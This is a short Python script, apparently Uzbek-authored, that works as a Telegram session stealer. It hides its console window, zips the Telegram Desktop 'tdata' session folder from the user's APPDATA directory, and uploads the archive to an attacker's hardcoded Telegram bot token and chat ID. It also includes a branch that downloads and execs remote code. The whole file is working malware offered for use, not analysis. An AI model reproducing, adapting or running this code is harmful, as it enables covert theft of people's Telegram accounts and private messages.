import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json

# O'z-o'zini ishga tushirish
if len(sys.argv) > 0 and "http" in sys.argv[0]:
    try:
        exec(urllib.request.urlopen(sys.argv[0]).read())
        sys.exit()
    except:
        pass

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_telegram_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

def zip_and_send():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    
    if os.path.exists(tdata_path):
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                        except: pass
            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
            os.remove(zip_path)
        except:
            pass

if __name__ == "__main__":
    zip_and_send()
